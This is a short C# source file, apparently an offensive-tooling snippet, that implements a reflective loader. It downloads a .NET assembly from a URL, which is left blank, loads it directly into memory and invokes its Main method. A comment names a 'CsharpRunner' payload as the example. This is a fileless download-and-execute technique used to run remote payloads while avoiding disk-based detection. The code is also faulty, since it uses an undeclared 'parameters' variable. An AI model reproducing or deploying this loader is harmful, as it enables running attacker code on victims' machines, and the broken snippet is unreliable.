using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Net;

namespace ReflectiveLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            // This is where you get you get your assembly from (CsharpRunner as an example here)
            var url = "";
            using (var wc = new WebClient())
            {
                Assembly a = Assembly.Load(wc.DownloadData(url));  
                // Get the type to use.
                Type myType = a.GetType("Csharprunner.Program");
                // Get the method to call.
                MethodInfo myMethod = myType.GetMethod("Main");

                if (myMethod == null)
                {
                    throw new Exception("No such method");
                }

              
                object obj = Activator.CreateInstance(myType);
                parameters[0] = new string[] { "" };
                var r = myMethod.Invoke(obj, parameters);
              


            }

        }
    }
}
